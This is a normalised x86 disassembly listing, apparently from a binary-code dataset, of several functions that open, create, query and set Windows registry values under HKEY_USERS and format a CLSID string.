mov [ esi + 0x10 ] ebx
cmp eax 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x7fc ]
push ecx
call sub_41a0d6
add esp 0x4
mov eax esi
xor ecx ecx
mov [ eax ] cx
jmp r-xdata
mov eax [ esi ]
xor ecx ecx
mov [ eax ] cx
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
xor edx edx
mov [ ebx + eax ] dx
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ ebx + eax ] dx
jmp r-xdata
lea ebx [ edi + edi ]
push ebx
push 0x0
push eax
call sub_41a0f0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
sub_417b00
push ebp
mov ebp esp
push 0xffffffff
push sub_42eea8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor edi edi
push 0x1
xor eax eax
mov ebx 0x7
push r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x68 ] edi
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x48 ] ax
call sub_403650
lea ecx [ ebp - 0x48 ]
push ecx
add esi 0x48
lea edx [ ebp - 0x64 ]
push esi
push edx
mov [ ebp - 0x4 ] 0x1
call sub_407e50
lea ecx [ ebp + 0x8 ]
push ecx
push eax
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x4 ] 0x2
call sub_407e00
mov esi 0x8
add esp 0x18
cmp [ ebp - 0x50 ] esi
jb r-xdata
xor ecx ecx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x64 ] cx
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_41a0d6
add esp 0x4
mov eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] esi
jae r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_41a0d6
add esp 0x4
lea ecx [ ebp - 0x68 ]
push ecx
push 0xf003f
push edi
push eax
push 0x80000003
call [ RegOpenKeyExW@IAT ]
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x2c ]
mov eax [ ebp - 0x68 ]
mov [ ebp - 0x6c ] eax
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov edx [ ebp - 0x68 ]
mov [ ebp - 0x6c ] edx
cmp [ ebp - 0x18 ] esi
jb r-xdata
xor edx edx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] dx
cmp [ ebp + 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_41a0d6
add esp 0x4
xor ecx ecx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] cx
cmp [ ebp + 0x1c ] esi
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_41a0d6
add esp 0x4
mov eax [ ebp - 0x6c ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0x1c
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp + 0x8 ]
push edx
jmp r-xdata
call sub_41a0d6
add esp 0x4
sub_417c60
push ebp
mov ebp esp
push 0xffffffff
push sub_42eee8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor edi edi
push 0x1
xor eax eax
mov ebx 0x7
push r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x68 ] edi
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x48 ] ax
call sub_403650
lea ecx [ ebp - 0x48 ]
push ecx
add esi 0x48
lea edx [ ebp - 0x64 ]
push esi
push edx
mov [ ebp - 0x4 ] 0x1
call sub_407e50
lea ecx [ ebp + 0x8 ]
push ecx
push eax
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x4 ] 0x2
call sub_407e00
mov esi 0x8
add esp 0x18
cmp [ ebp - 0x50 ] esi
jb r-xdata
xor ecx ecx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x64 ] cx
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_41a0d6
add esp 0x4
mov eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] esi
jae r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_41a0d6
add esp 0x4
lea ecx [ ebp - 0x68 ]
push ecx
push 0x2
push edi
push eax
push 0x80000003
call [ RegOpenKeyExW@IAT ]
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x2c ]
mov ebx [ ebp - 0x68 ]
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] esi
jae r-xdata
xor ecx ecx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] cx
cmp [ ebp + 0x1c ] esi
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_41a0d6
add esp 0x4
push edi
lea edx [ ebp - 0x68 ]
push edx
push edi
push 0x2
push edi
push edi
push edi
push eax
push 0x80000003
call [ RegCreateKeyExW@IAT ]
lea eax [ ebp - 0x2c ]
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0x1c
mov edx [ ebp + 0x8 ]
push edx
call sub_41a0d6
add esp 0x4
sub_417db0
push ebp
mov ebp esp
push 0xffffffff
push sub_42ef67
mov eax [ fs : 0x0 ]
push eax
sub esp 0xfc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x24 ]
mov edx [ ebp + 0x2c ]
mov edi ecx
mov ecx [ ebp + 0x28 ]
mov [ ebp - 0x74 ] eax
mov eax [ ebp + 0x30 ]
mov [ ebp - 0x70 ] ecx
mov [ ebp - 0x6c ] edx
mov [ ebp - 0x68 ] eax
lea ecx [ ebp - 0x2c ]
push ecx
xor esi esi
mov ecx edi
mov [ ebp - 0x4 ] esi
call sub_417890
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x1c ] esi
jne r-xdata
lea edx [ ebp - 0x108 ]
push edx
lea eax [ ebp - 0x74 ]
push eax
call [ StringFromCLSID@IAT ]
mov edx [ ebp - 0x108 ]
xor ecx ecx
mov eax edx
mov [ ebp - 0x90 ] cx
mov ebx 0x7
lea ecx [ eax + 0x2 ]
mov [ ebp - 0x7c ] ebx
mov [ ebp - 0x80 ] esi
mov [ ebp - 0x104 ] ecx
nop
mov edi 0x8
cmp [ ebp - 0x18 ] edi
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax [ ebp - 0x104 ]
lea ecx [ ebp - 0x90 ]
sar eax 0x1
push eax
push edx
call sub_403650
push 0x1
xor edx edx
push r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] dx
call sub_403650
push 0x1
xor eax eax
push r--data
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x64 ] ax
call sub_403650
lea ecx [ ebp - 0x64 ]
push ecx
lea edx [ ebp - 0x2c ]
push edx
lea eax [ ebp - 0xe4 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_407e50
lea ecx [ ebp + 0x8 ]
push ecx
push eax
lea edx [ ebp - 0x100 ]
push edx
mov [ ebp - 0x4 ] 0x5
call sub_407e00
lea ecx [ ebp - 0x48 ]
push ecx
push eax
lea edx [ ebp - 0xc8 ]
push edx
mov [ ebp - 0x4 ] 0x6
call sub_413870
lea ecx [ ebp - 0x90 ]
push ecx
push eax
lea edx [ ebp - 0xac ]
push edx
mov [ ebp - 0x4 ] bl
call sub_413870
add esp 0x30
push eax
lea ecx [ edi + 0x48 ]
mov [ ebp - 0x4 ] 0x8
call sub_403a40
mov edi 0x8
cmp [ ebp - 0x98 ] edi
jb r-xdata
xor eax eax
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] ax
cmp [ ebp + 0x1c ] edi
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_41a0d6
add esp 0x4
xor ecx ecx
mov [ ebp - 0x98 ] ebx
mov [ ebp - 0x9c ] esi
mov [ ebp - 0xac ] cx
cmp [ ebp - 0xb4 ] edi
jb r-xdata
mov eax [ ebp - 0xac ]
push eax
call sub_41a0d6
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0x2c
mov ecx [ ebp + 0x8 ]
push ecx
jmp r-xdata
xor eax eax
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0xb8 ] esi
mov [ ebp - 0xc8 ] ax
cmp [ ebp - 0xec ] edi
jb r-xdata
mov edx [ ebp - 0xc8 ]
push edx
call sub_41a0d6
add esp 0x4
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ ebp - 0xec ] ebx
mov [ ebp - 0xf0 ] esi
mov [ ebp - 0x100 ] dx
cmp [ ebp - 0xd0 ] edi
jb r-xdata
mov ecx [ ebp - 0x100 ]
push ecx
call sub_41a0d6
add esp 0x4
xor ecx ecx
mov [ ebp - 0xd0 ] ebx
mov [ ebp - 0xd4 ] esi
mov [ ebp - 0xe4 ] cx
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov eax [ ebp - 0xe4 ]
push eax
call sub_41a0d6
add esp 0x4
xor eax eax
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x64 ] ax
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov edx [ ebp - 0x64 ]
push edx
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] dx
cmp [ ebp - 0x7c ] edi
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_41a0d6
add esp 0x4
cmp [ ebp - 0x18 ] edi
jb r-xdata
mov eax [ ebp - 0x90 ]
push eax
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] dx
cmp [ ebp + 0x1c ] edi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_41a0d6
add esp 0x4
mov eax [ ebp + 0x8 ]
push eax
sub_4180a0
push ebp
mov ebp esp
push 0xffffffff
push sub_42ef98
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
sub esp 0x1c
mov [ ebp - 0x2c ] esp
mov ecx esp
xor eax eax
push 0xffffffff
push eax
lea edx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push edx
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] ax
call sub_401ae0
mov ecx esi
call sub_417b00
mov esi eax
test esi esi
jne r-xdata
mov edx [ ebp + 0x24 ]
xor eax eax
push edx
push r--data
mov [ ebp - 0x26 ] eax
mov [ ebp - 0x22 ] eax
mov [ ebp - 0x1e ] eax
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] eax
mov [ ebp - 0x12 ] ax
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x28 ]
xor ecx ecx
push 0xc
push eax
mov [ ebp - 0x28 ] cx
mov [ ebp - 0x2c ] 0x4
call sub_41b638
add esp 0x10
lea ecx [ ebp - 0x2c ]
push ecx
lea edx [ ebp - 0x30 ]
push edx
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push esi
call [ RegQueryValueExW@IAT ]
push esi
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
call [ RegCloseKey@IAT ]
cmp [ ebp + 0x1c ] 0x8
mov esi [ ebp - 0x30 ]
jb r-xdata
call [ RegCloseKey@IAT ]
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41a0d6
add esp 0x4
mov eax esi
mov edx [ ebp + 0x8 ]
push edx
call sub_41a0d6
add esp 0x4
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41a0d6
add esp 0x4
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0x20
sub_4181d0
push ebp
mov ebp esp
push 0xffffffff
push sub_42efc8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
sub esp 0x1c
mov [ ebp - 0x2c ] esp
mov ecx esp
xor edi edi
push 0xffffffff
push edi
lea edx [ ebp + 0x8 ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edi
push edx
mov [ ebp - 0x4 ] edi
mov [ ecx ] ax
call sub_401ae0
mov ecx esi
call sub_417b00
mov esi eax
cmp esi edi
je r-xdata
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
mov edx [ ebp + 0x24 ]
xor eax eax
push edx
push r--data
mov [ ebp - 0x26 ] eax
mov [ ebp - 0x22 ] eax
mov [ ebp - 0x1e ] eax
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] eax
mov [ ebp - 0x12 ] ax
lea eax [ ebp - 0x28 ]
xor ecx ecx
push 0xc
push eax
mov [ ebp - 0x28 ] cx
call sub_41b638
mov ebx [ RegQueryValueExW@IAT ]
add esp 0x10
lea ecx [ ebp - 0x2c ]
push ecx
push edi
push edi
push edi
lea edx [ ebp - 0x28 ]
push edx
push esi
call ebx
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41a0d6
add esp 0x4
mov ecx [ ebp - 0x2c ]
push 0x1
push ecx
call sub_41acef
mov edi eax
add esp 0x8
test edi edi
jne r-xdata
push esi
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0x20
lea eax [ ebp - 0x2c ]
push eax
push edi
push 0x0
push 0x0
lea ecx [ ebp - 0x28 ]
push ecx
push esi
call ebx
push esi
test eax eax
je r-xdata
push esi
call [ RegCloseKey@IAT ]
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
call [ RegCloseKey@IAT ]
push 0x8
call sub_41ac18
add esp 0x4
test eax eax
je r-xdata
call [ RegCloseKey@IAT ]
push edi
call sub_41a7eb
add esp 0x4
lea ecx [ ebp + 0x8 ]
call sub_401900
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_41a0d6
add esp 0x4
xor eax eax
jmp r-xdata
xor esi esi
mov ecx [ ebp - 0x2c ]
mov [ eax ] edi
mov [ eax + 0x4 ] ecx
mov esi eax
jmp r-xdata
lea ecx [ ebp + 0x8 ]
call sub_401900
mov eax esi
sub_418350
push ebp
mov ebp esp
push 0xffffffff
push sub_42eff8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x2c ] esp
xor eax eax
push 0xffffffff
push eax
lea edx [ ebp + 0xc ]
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push edx
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] ax
call sub_401ae0
mov ecx esi
call sub_417c60
mov esi eax
test esi esi
je r-xdata
cmp [ ebp + 0x20 ] 0x8
jb r-xdata
mov edx [ ebp + 0x28 ]
xor eax eax
push edx
push r--data
mov [ ebp - 0x26 ] eax
mov [ ebp - 0x22 ] eax
mov [ ebp - 0x1e ] eax
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] eax
mov [ ebp - 0x12 ] ax
lea eax [ ebp - 0x28 ]
xor ecx ecx
push 0xc
push eax
mov [ ebp - 0x28 ] cx
call sub_41b638
add esp 0x10
push 0x4
lea ecx [ ebp + 0x8 ]
push ecx
push 0x4
push 0x0
lea edx [ ebp - 0x28 ]
push edx
push esi
call [ RegSetValueExW@IAT ]
push esi
test eax eax
je r-xdata
xor al al
jmp r-xdata
mov eax [ ebp + 0xc ]
push eax
call sub_41a0d6
add esp 0x4
call [ RegCloseKey@IAT ]
cmp [ ebp + 0x20 ] 0x8
jb r-xdata
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0x24
mov al 0x1
mov ecx [ ebp + 0xc ]
push ecx
call sub_41a0d6
add esp 0x4
sub_418460
push ebp
mov ebp esp
push 0xffffffff
push sub_42f028
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov esi ecx
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x2c ] esp
xor eax eax
push 0xffffffff
push eax
lea edx [ ebp + 0xc ]
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push edx
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] ax
call sub_401ae0
mov ecx esi
call sub_417c60
mov esi eax
test esi esi
jne r-xdata
mov edx [ ebp + 0x28 ]
xor eax eax
push edx
push r--data
mov [ ebp - 0x26 ] eax
mov [ ebp - 0x22 ] eax
mov [ ebp - 0x1e ] eax
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] eax
mov [ ebp - 0x12 ] ax
lea eax [ ebp - 0x28 ]
xor ecx ecx
push 0xc
push eax
mov [ ebp - 0x28 ] cx
call sub_41b638
mov eax [ edi + 0x4 ]
mov edi [ edi ]
add esp 0x10
push eax
push edi
push 0x3
push 0x0
lea ecx [ ebp - 0x28 ]
push ecx
push esi
call [ RegSetValueExW@IAT ]
push esi
test eax eax
je r-xdata
cmp [ ebp + 0x20 ] 0x8
jb r-xdata
call [ RegCloseKey@IAT ]
cmp [ ebp + 0x20 ] 0x8
jb r-xdata
call [ RegCloseKey@IAT ]
cmp [ ebp + 0x20 ] 0x8
jb r-xdata
xor al al
jmp r-xdata
mov eax [ ebp + 0xc ]
push eax
call sub_41a0d6
add esp 0x4
mov al 0x1
mov eax [ ebp + 0xc ]
push eax
call sub_41a0d6
add esp 0x4
mov edx [ ebp + 0xc ]
push edx
call sub_41a0d6
add esp 0x4
xor al al
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0x24
sub_418590
push ebp
mov ebp esp
push 0xffffffff
push sub_42f120
mov eax [ fs : 0x0 ]
push eax
sub esp 0x138
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi ecx
mov ecx [ ebp + 0xc ]
mov [ edi + 0x4 ] r--data
mov [ ebp - 0x140 ] eax
xor ebx ebx
mov [ edi ] r--data
mov [ edi + 0x4 ] r--data
mov eax 0x7
xor edx edx
mov [ edi + 0x1c ] eax
mov [ edi + 0x18 ] ebx
mov [ ebp - 0x144 ] edi
mov [ ebp - 0x138 ] ecx
mov [ ebp - 0x130 ] ebx
mov [ edi + 0x8 ] dx
xor ecx ecx
mov [ edi + 0x38 ] eax
mov [ edi + 0x34 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ edi + 0x24 ] cx
mov [ edi + 0x5c ] eax
mov [ edi + 0x58 ] ebx
mov [ edi + 0x48 ] dx
push 0x18
mov [ ebp - 0x4 ] 0x2
call sub_41ac18
add esp 0x4
mov [ ebp - 0x134 ] eax
mov [ ebp - 0x4 ] 0x3
cmp eax ebx
je r-xdata
xor esi esi
mov ecx eax
call sub_412420
mov esi eax
jmp r-xdata
mov esi [ ebp - 0x140 ]
cmp esi ebx
je r-xdata
mov ecx esi
call sub_412460
push esi
call sub_41a0d6
add esp 0x4
push 0xb
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_4124b0
push 0x6
push rw-data
mov ecx esi
call sub_412490
lea eax [ ebp - 0x128 ]
push eax
mov ecx esi
call sub_412790
push 0x16
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0x4
call sub_412490
lea ecx [ ebp - 0xf0 ]
push ecx
mov ecx esi
call sub_412790
movzx edx [ rw-data ]
push edx
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x134 ] esp
push 0xffffffff
push ebx
lea edx [ ebp - 0xf0 ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push edx
mov [ ebp - 0x4 ] 0x5
mov [ ecx ] ax
call sub_401ae0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x13c ] esp
push 0xffffffff
push ebx
lea edx [ ebp - 0x128 ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push edx
mov [ ebp - 0x4 ] 0x6
mov [ ecx ] ax
call sub_401ae0
lea eax [ ebp - 0xb8 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x5
call sub_417250
push 0x6
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0x7
call sub_412490
lea ecx [ ebp - 0x10c ]
push ecx
mov ecx esi
call sub_412790
push 0x16
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0x8
call sub_412490
lea edx [ ebp - 0xd4 ]
push edx
mov ecx esi
call sub_412790
movzx eax [ rw-data ]
mov [ ebp - 0x4 ] 0x9
push eax
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x13c ] esp
push 0xffffffff
push ebx
lea eax [ ebp - 0xd4 ]
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push eax
mov [ ecx ] dx
call sub_401ae0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x134 ] esp
push 0xffffffff
push ebx
lea eax [ ebp - 0x10c ]
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push eax
mov [ ebp - 0x4 ] 0xa
mov [ ecx ] dx
call sub_401ae0
lea ecx [ ebp - 0x9c ]
push ecx
mov ecx edi
mov [ ebp - 0x4 ] 0x9
call sub_417250
mov [ ebp - 0x4 ] 0xb
cmp esi ebx
je r-xdata
mov al [ ebp - 0x130 ]
xor edx edx
mov eax esi
mov [ ebp - 0x2c ] dx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
lea edx [ eax + 0x2 ]
cmp [ ebp - 0x129 ] bl
je r-xdata
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x2c ]
call sub_403650
cmp [ ebp - 0x1c ] 0x2
mov eax 0x1
jb r-xdata
push 0x1
xor eax eax
push r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] ax
call sub_403650
xor ecx ecx
mov eax esi
mov [ ebp - 0x4 ] 0xc
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] cx
lea edx [ eax + 0x2 ]
push 0xffffffff
push ebx
lea ecx [ ebp - 0xb8 ]
push ecx
lea ecx [ edi + 0x8 ]
call sub_401ae0
push 0xffffffff
push ebx
lea edx [ ebp - 0x9c ]
push edx
lea ecx [ edi + 0x24 ]
call sub_401ae0
mov esi 0x8
jmp r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_41a0d6
add esp 0x4
mov [ ebp - 0x129 ] 0x1
mov [ ebp - 0x129 ] bl
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x2c ]
call sub_403650
lea edx [ ebp - 0x48 ]
push edx
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x64 ]
push ecx
mov [ ebp - 0x4 ] 0xd
call sub_413870
lea edx [ ebp - 0xb8 ]
push edx
push eax
lea eax [ ebp - 0x80 ]
push eax
mov [ ebp - 0x4 ] 0xe
call sub_407e00
add esp 0x18
push eax
lea ecx [ edi + 0x8 ]
mov [ ebp - 0x4 ] 0xf
call sub_403a40
cmp [ ebp - 0x6c ] 0x8
jb r-xdata
lea eax [ edi + 0x48 ]
mov [ edi + 0x40 ] ebx
mov [ edi + 0x44 ] ebx
mov [ eax + 0x10 ] ebx
cmp [ eax + 0x14 ] esi
jb r-xdata
test al 0x1
je r-xdata
xor edx edx
cmp [ ebp - 0x50 ] 0x8
mov [ ebp - 0x6c ] 0x7
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] dx
jb r-xdata
mov ecx [ ebp - 0x80 ]
push ecx
call sub_41a0d6
add esp 0x4
xor ecx ecx
mov [ eax ] cx
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ ebp + 0x18 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0x1c ]
mov [ eax + 0x8 ] edx
sub esp 0x1c
mov [ eax + 0xc ] ecx
mov eax [ ebp - 0x138 ]
mov ecx esp
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
mov [ ecx ] dx
lea edx [ eax + 0x2 ]
mov [ ebp - 0x13c ] esp
mov [ ebp - 0x130 ] edx
lea ecx [ ecx ]
mov eax [ eax ]
xor ecx ecx
cmp [ ebp - 0x18 ] 0x8
mov [ ebp - 0x50 ] 0x7
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] cx
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_41a0d6
add esp 0x4
mov dx [ eax ]
add eax 0x2
cmp dx bx
jne r-xdata
sub eax [ ebp - 0x130 ]
sar eax 0x1
push eax
mov eax [ ebp - 0x138 ]
push eax
call sub_403650
mov ecx edi
call sub_417db0
cmp [ ebp - 0x88 ] esi
jb r-xdata
xor eax eax
cmp [ ebp - 0x34 ] 0x8
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] ax
mov [ ebp - 0x4 ] 0xb
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ ebp - 0x88 ] 0x7
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] dx
cmp [ ebp - 0xc0 ] esi
jb r-xdata
mov ecx [ ebp - 0x9c ]
push ecx
call sub_41a0d6
add esp 0x4
push 0x1
xor edx edx
push r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] dx
call sub_403650
xor eax eax
mov [ ebp - 0x2c ] ax
mov eax esi
mov [ ebp - 0x4 ] 0x10
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
lea edx [ eax + 0x2 ]
jmp r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_41a0d6
add esp 0x4
xor ecx ecx
mov [ ebp - 0xc0 ] 0x7
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xd4 ] cx
cmp [ ebp - 0xf8 ] esi
jb r-xdata
mov eax [ ebp - 0xd4 ]
push eax
